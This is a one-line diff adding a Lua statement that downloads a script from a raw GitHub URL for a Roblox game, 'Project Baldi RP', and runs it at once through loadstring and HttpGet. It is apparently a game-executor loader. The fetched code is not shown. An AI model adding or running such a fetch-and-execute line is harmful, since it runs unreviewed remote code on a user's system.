@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxiansx/UGC/main/Project%20Baldi%20RP.lua", true))()
